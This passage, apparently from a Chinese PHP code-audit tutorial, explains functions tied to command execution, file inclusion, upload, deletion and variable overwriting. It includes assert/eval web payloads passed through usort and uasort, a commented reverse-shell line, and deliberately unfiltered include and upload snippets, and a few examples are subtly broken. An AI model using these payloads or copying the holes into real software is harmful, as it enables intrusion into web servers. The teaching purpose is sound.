<p>参数 </p>
<p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。</p>
<ul>
<li>callback：即将被调用的回调函数</li>
<li>parameter：传入回调函数的参数</li>
</ul>
<p>在前面自定义的函数中加入能执行命令的代码就可以代码执行了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system($a);</span><br><span class="line">    &#125;</span><br><span class="line">    $cmd = <span class="string">'whoami'</span>;</span><br><span class="line">    call_user_func(<span class="string">'callback'</span>,$cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><p>这个函数名称跟上没什么大的差别，唯一的区别就在于参数的传递上，这个函数是把一个数组作为回调函数的参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func_array( callable $callback, <span class="keyword">array</span> $param_arr) : mixed</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>callback：被调用的回调函数</li>
<li>param_arr：要被传入回调函数的数组，这个数组需要是索引数组</li>
</ul>
<p>示例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system($a);</span><br><span class="line">    &#125;</span><br><span class="line">    $cmd = <span class="keyword">array</span>(<span class="string">'whoami'</span>);</span><br><span class="line">    call_user_func_array(<span class="string">'callback'</span>,$cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h4><p>用回调函数过滤数数组中的单元</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">array_filter( <span class="keyword">array</span> $array[, callable $callback[, int $flag = <span class="number">0</span>]] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure>

<p>依次将<code>array</code>数组中的每个值传到<code>callback</code>函数。如果<code>callback</code>函数返回<code>true</code>，则<code>array</code>数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
<p>参数 </p>
<ul>
<li>array：要循环的数组</li>
<li>callback：使用的回调函数。如果没有提供<code>callback</code>函数，将删除<code>array</code>中所有等值为FALSE的条目。</li>
<li>flag：决定<code>callback</code>接收的参数形式</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cmd=<span class="string">'whoami'</span>;</span><br><span class="line">    $array1=<span class="keyword">array</span>($cmd);</span><br><span class="line">    $func =<span class="string">'system'</span>;</span><br><span class="line">    array_filter($array1,$func);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h4><p>使用用户自定义的比较函数对数组中的值进行排序</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">usort( <span class="keyword">array</span> &amp;$array, callable $value_compare_func) : bool</span><br></pre></td></tr></table></figure>

<p>参数</p>
<ul>
<li>array：输入的数组</li>
<li>cmp_function：在第一个参数小于、等于或大于第二个参数时，该比较函数必须相应地返回一个小于、等于或大于0的数</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    usort(...$_GET);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">1.</span>php?<span class="number">1</span>[<span class="number">0</span>]=<span class="number">0</span>&amp;<span class="number">1</span>[<span class="number">1</span>]=<span class="keyword">eval</span>($_POST[<span class="string">'x'</span>])&amp;<span class="number">2</span>=assert</span><br><span class="line">POST传参: x=phpinfo();</span><br></pre></td></tr></table></figure>

<p><code>usort</code>的参数通过GET传参，第一个参数也就是<code>$_GET[0]</code>，随便传入一个数字即可。第二个参数也就是<code>$_GET[1]</code>是我们要调用的函数名称，这里采用的是<code>assert</code>函数。</p>
<h4 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h4><p>这个跟上一个差不多，区别不是很大。此函数对数组排序并保持索引和单元之间的关联。也就是说你这个排完序之后呢，它原来对应的索引也会相应改变，类似于“绑定”。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">uasort( <span class="keyword">array</span> &amp;$array, callable $value_compare_func) : bool</span><br></pre></td></tr></table></figure>

<p>参数</p>
<ul>
<li>array：输入的数组</li>
<li>value_compare_func：用户自定义的函数</li>
</ul>
<p>在排完序之后索引也跟着值的位置变化而变化了。那么代码执行的示例代码其实也和上一个差不多。</p>
<p>代码示例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">	$onearray = <span class="keyword">array</span>(<span class="string">'Ameng'</span>, $_POST[<span class="string">'x'</span>]);</span><br><span class="line">	uasort($onearray, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">payload: <span class="number">1.</span>php?a=assert</span><br><span class="line">POST传参: x=phpinfo();</span><br></pre></td></tr></table></figure>

<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>这个函数想必我们都是比较熟悉的，此函数就是执行外部指令，并且显示输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system( string $command[, int &amp;$return_var] ) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：必需。要执行的命令</li>
<li>return_var：可选。若设置了这个参数，那么命令执行后的返回状态就会被放到这个变量中</li>
</ul>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cmd = <span class="string">'whoami'</span>;</span><br><span class="line">    system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>这个其实和上面<code>system</code>函数没有太大区别，都是执行外部程序指令，只不过这个函数多了一个参数，可以让我们把命令执行输出的结果保存到一个数组中。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec( string $command[, <span class="keyword">array</span> &amp;$output[, int &amp;$return_var]] ) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：必需。要执行的命令</li>
<li>output：可选。如果设置了此参数，那么命令执行的结果将会保存到此数组。</li>
<li>return_var：可选。命令执行的返回状态。</li>
</ul>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">'whoami'</span>;</span><br><span class="line"><span class="keyword">echo</span> exec($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>此函数通过shell环境执行命令，并且将完整的输出以字符串的方式返回。如果执行过程中发生错误或者进程不产生输出，那么就返回<code>NULL</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell_exec( string $cmd) : string</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>cmd：要执行的命令</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">'whoami'</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>执行外部程序并且显示原始输出。既然我们已经有执行命令的函数了，那么这个函数我们什么时候会用到呢？当所执行的Unix命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代<code>exec()</code>或<code>system()</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">passthru( string $command[, int &amp;$return_var] ) : void</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：要执行的命令</li>
<li>return_var：Unix命令的返回状态将被记录到此函数。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">一、</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    passthru(<span class="string">'whoami'</span>);	<span class="comment">//直接将结果返回到页面</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">二、</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    passthru(<span class="string">'whoami'</span>,$result);	<span class="comment">//将结果返回到一个变量，然后通过输出变量值得到输出内容</span></span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>在当前进程空间执行指定程序。关键点就在于进程空间，倘若我现在设定一个条件，你只有在某个子进程中才能读取phpinfo，那这个时候，我们就需要用到这个函数了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pcntl_exec( string $path[, <span class="keyword">array</span> $args[, <span class="keyword">array</span> $envs]] ) : void</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>path：path必须时可执行二进制文件路径或在一个文件第一行指定了一个可执行文件路径标头的脚本(比如文件第一行是#!/usr/local/bin/perl的perl脚本)</li>
<li>args：此参数是一个传递给程序的参数的字符串数组</li>
<li>envs：环境变量，这个想必大家都很熟悉，只不过这里强调一点，这里传入的是数组，数组格式是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。</li>
</ul>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//father</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	pcntl_exec(<span class="string">'/usr/local/bin/php'</span>, [<span class="string">'2.php'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//son</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>此函数使用command参数打开进程文件指针。如果出错，那么该函数就会返回FALSE。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">popen(command,mode)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>command：要执行的命令</li>
<li>mode：必需。规定连接的模式<ul>
<li>r：只读</li>
<li>w：只写（打开并清空已有文件或创建一个新文件）</li>
</ul>
</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = popen(<span class="string">"demo.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">	pclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = popen(<span class="string">"/bin/ls"</span>,<span class="string">"r"</span>);</span><br><span class="line"><span class="comment">//some code to be executed</span></span><br><span class="line">pclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h4><p>此函数执行一个命令，并且打开用来输入或者输出的文件指针</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">proc_open( string $cmd, <span class="keyword">array</span> $descriptorspec, <span class="keyword">array</span> &amp;$pipes[, string $cwd = <span class="keyword">NULL</span>[, <span class="keyword">array</span> $env = <span class="keyword">NULL</span>[, <span class="keyword">array</span> $other_options = <span class="keyword">NULL</span>]]] )</span><br></pre></td></tr></table></figure>

<p>此函数其实和<code>popen</code>函数类似，都是执行命令</p>
<p>参数 </p>
<ul>
<li>cmd：要执行的命令</li>
<li>descriptorspec：索引数组。数组中的键值表示描述符，元素值表示 PHP 如何将这些描述符传送至子进程。0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。</li>
<li>pipes：将被置为索引数组，其中的元素是被执行程序创建的管道对应到PHP这一段的文件指针。</li>
<li>cwd：要执行命令的初始工作目录。必需是绝对路径。此参数默认使用 NULL（表示当前 PHP 进程的工作目录）</li>
<li>env。要执行命令所使用的环境变量。此参数默认为 NULL（表示和当前 PHP 进程相同的环境变量）</li>
<li>other_options：可选。附加选项<ul>
<li>suppress_errors （仅用于 Windows 平台）：设置为 TRUE 表示抑制本函数产生的错误。</li>
<li>bypass_shell （仅用于 Windows 平台）：设置为 TRUE 表示绕过 cmd.exe shell。</li>
</ul>
</li>
</ul>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><code>include</code>将会包含语句并执行指定文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'filename'</span>;</span><br></pre></td></tr></table></figure>

<p>关键点就在于执行指定文件，执行给了我们代码执行的机会。倘若此时我们构造了一个后门文件，需要在目标机器执行进行shell反弹，那么如果代码中有<code>include</code>而且没有进行过滤，那么我们就可以使用该函数来执行我们的后门函数。演示如下。</p>
<p>示例代码(1.php)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>示例代码(2.php)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//这里可以使用PHP来反弹shell，我这里只是演示</span></span><br><span class="line">	<span class="comment">//$sock=fsockopen("127.0.0.1",4444);exec("bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;h1&gt;[*]backdoor is running!&lt;/h1&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">payload：<span class="number">1.</span>php?file=<span class="number">2.</span>php</span><br></pre></td></tr></table></figure>

<h4 id="include-once"><a href="#include-once" class="headerlink" title="include_once()"></a>include_once()</h4><p><code>include_once</code>与<code>include</code>没有太大区别，唯一的其区别已经在名称中体现了，就是相同的文件只包含一次。其他功能和<code>include_once</code>一样，只是增加对每个文件包含的次数。</p>
<h4 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h4><p><code>require</code>的实现和<code>include</code>功能几乎完全相同，那既然一样为什么还要多一个这样的函数呢？( 我也不知道)</p>
<p>其实两者还是有点区别的，什么区别呢？这么说，如果你包含的文件的代码里面有错误，你觉得会发生什么？是继续执行包含的文件，还是停止执行呢？所以区别就在这里产生了。</p>
<p><code>require</code>在出错时会导致脚本终止，而<code>include</code>在出错时只是发生警告，脚本还是继续执行。</p>
<h4 id="require-once"><a href="#require-once" class="headerlink" title="require_once()"></a>require_once()</h4><p>这两者关系和<code>include</code>与<code>include_once</code>的关系是一样的。</p>
<h3 id="文件读取-下载"><a href="#文件读取-下载" class="headerlink" title="文件读取(下载)"></a>文件读取(下载)</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><p>函数功能是将整个文件读入一个字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_get_contents(path,include_path,context,start,max_length)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：要读取文件的名称。</li>
<li>include_path：可选。如果也想在 include_path 中搜索文件，可以设置为1。</li>
<li>context：可选。规定句柄的位置。</li>
<li>start：可选。规定文件中开始读取的位置。</li>
<li>max_length：可选。规定读取的字节数。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'demo.txt'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h4><p>此函数将打开一个文件或URL，如果 fopen() 失败，它将返回 FALSE 并附带错误信息。我们可以通过在函数名前面添加一个 <code>@</code> 来隐藏错误输出。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fopen(filename,mode,include_path,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：必需。要打开的文件或URL</li>
<li>mode：必需。规定访问类型（例如只读，只写，读写方式等，方式的规定和其他语言的规定方式一致）</li>
<li>include_path：可选。就是你可以指定搜索的路径位置，如果要指定的话，那么该参数要指定为1</li>
<li>context：可选。规定句柄的环境。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = fopen(<span class="string">"demo.txt"</span>,<span class="string">"rb"</span>);</span><br><span class="line">	$content = fread($file,<span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">echo</span> $content;</span><br><span class="line">	fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码中其实也包含了<code>fread</code>的用法。因为<code>fread</code>仅仅只是打开一个文件，要想读取还得需要用到<code>fread</code>来读取文件内容。</p>
<h4 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h4><p>这个函数刚才在上个函数中基本已经演示过了，就是读取文件内容。这里代码就不再演示了，简单介绍一下参数和用法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string fread ( resource $handle , int $length )</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>handle：文件系统指针，是典型地由 <code>fopen</code>创建的<code>resource</code>。</li>
<li>length：必需。你要读取的最大字节数。</li>
</ul>
<h4 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h4><p>从打开的文件中读取一行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fgets(file,length)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。规定要读取的文件。</li>
<li>length：可选。规定要读取的字节数。默认是1024字节。</li>
</ul>
<p>可以看出这个函数和之前的fread区别不是很大，只不过这个读取的是一行。</p>
<h4 id="fgetss"><a href="#fgetss" class="headerlink" title="fgetss()"></a>fgetss()</h4><p>这个函数跟上个没什么差别，也是从打开的文件中读取去一行，只不过过滤掉了 HTML 和 PHP 标签。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fgetss(file,length,tags)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。要检查的文件。</li>
<li>length：可选。规定要读取的字节数，默认1024字节。</li>
<li>tags：可选。哪些标记不去掉。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = fopen(<span class="string">"demo.html"</span>,<span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">echo</span> fgetss($file);</span><br><span class="line">	fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h4><p>这个函数从名称基本就知道它是干啥的了，读文件用的。此函数将读取一个文件，并写入到输出缓冲中。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：必需。要读取的文件。</li>
<li>include_path：可选。规定要搜索的路径。</li>
<li>context：可选。规定文件句柄环境。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span> . readfile(<span class="string">"demo.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h4><p>把文件读入到一个数组中，数组中每一个元素对应的是文件中的一行，包括换行符。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file(path,include_path,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>path：必需。要读取的文件。</li>
<li>include_path：可选。可指定搜索路径。</li>
<li>context：可选。设置句柄环境。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(file(<span class="string">"demo.txt"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="parse-ini-file"><a href="#parse-ini-file" class="headerlink" title="parse_ini_file()"></a>parse_ini_file()</h4><p>从名称可以看出，这个函数不是读取一个简单的文件。它的功能是解析一个配置文件(ini文件)，并以数组的形式返回其中的位置。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_ini_file(file,process_sections)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。要读取的ini文件</li>
<li>process_sections：可选。若为TRUE，则返回一个多维数组，包括了详细信息</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	print_r(parse_ini_file(<span class="string">"demo.ini"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="show-source-highlight-file"><a href="#show-source-highlight-file" class="headerlink" title="show_source()/highlight_file()"></a>show_source()/highlight_file()</h4><p>这两个函数没什么好说的，想必大家也经常见到这两个函数，其作用就是让php代码显示在页面上。这两个没有任何区别，<code>show_source</code>其实就是<code>highlight_file</code>的别名。</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file()"></a>move_uploaded_file()</h4><p>此函数是将上传的文件移动到新位置。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">move_uploaded_file(file,newloc)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。规定要移动的文件。</li>
<li>newloc：必需。规定文件的新位置。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$fileName = $_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].<span class="string">'/uploads/'</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$fileName )</span><br></pre></td></tr></table></figure>

<p>这段代码就是直接接收上传的文件，没有进行任何的过滤，那么当我们上传getshell的后门时，就可以直接获取权限，可见这个函数是不能乱用的，即便要用也要将过滤规则完善好，防止上传不合法文件。</p>
<h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink()"></a>unlink()</h4><p>此函数用来删除文件。成功返回 TURE ，失败返回 FALSE。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">unlink(filename,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：必需。要删除的文件。</li>
<li>context：可选。句柄环境。</li>
</ul>
<p>我们知道，一些网站是有删除功能的。比如常见的论坛网站，是有删除评论或者文章功能的。倘若网站没有对删除处做限制，那么就可能会导致任意文件删除（甚至删除网站源码）。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = <span class="string">"demo.txt"</span>;</span><br><span class="line">    <span class="keyword">if</span>(unlink($file))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"$file have been deleted"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"$file not exist?"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">php&gt;</span><br></pre></td></tr></table></figure>

<h4 id="session-destroy"><a href="#session-destroy" class="headerlink" title="session_destroy()"></a>session_destroy()</h4><p>在了解这个函数之前，我们需要先了解 PHP session。 PHP session 变量用于存储关于用户会话的信息。关于 sesson 的机制这里我就不再过于详细介绍。</p>
<p><code>session_destroy()</code>函数用来销毁一个会话中的全部数据，但并不会重置当前会话所关联的全局变量，同时也不会重置会话 cookie</p>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><h4 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h4><p>此函数从数组中将变量导入到当前的符号表。其实作用就是给变量重新赋值，从而达到变量覆盖的作用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">extract(<span class="keyword">array</span>,extract_rules,prefix)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>array：必需。规定要使用的数组。</li>
<li>extract_rules：可选。extract函数将检查每个键名是否为合法的变量名，同时也检查和符号中已经存在的变量名是否冲突，对不合法或者冲突的键名将会根据此参数的设定的规则来决定。<ul>
<li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</li>
<li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li>
<li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</li>
<li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。</li>
<li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。</li>
<li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li>
<li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li>
<li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li>
</ul>
</li>
<li>prefix：可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name = <span class="string">'cat'</span>;</span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">echo</span> $name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>参时如果我们POST传入name=dog，那么页面将会回显dog，说明这个函数的使用让我们实现了变量的覆盖，改变了变量的值。</p>
<h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h4><p>此函数把查询到的字符串解析到变量中。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str(string,<span class="keyword">array</span>)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>string：必需。规定要解析的字符串。</li>
<li>array：可选。规定存储变量的数组名称。该参数只是变量存储到数组中。代码示例：</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$name = <span class="string">'who'</span>;</span><br><span class="line">    $age = <span class="string">'20'</span>;</span><br><span class="line">    parse_str(<span class="string">"name=Ameng&amp;age=21"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$name, $age"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">Ameng, <span class="number">21</span></span><br></pre></td></tr></table></figure>

<p>通过上述代码，我们可以发现，变量name和age都发生了变化，被新的值覆盖了。这里我用的是 PHP 7.4.3 版本。发现这个函数的这个作用还是存在的，且没有任何危险提示。</p>
<h4 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h4><p>此函数将GET/POST/Cookie变量导入到全局作用域中。从而能够达到变量覆盖的作用。</p>
<p>版本要求：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">bool import_request_variables ( string $types [, string $prefix ] )</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>types：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。</li>
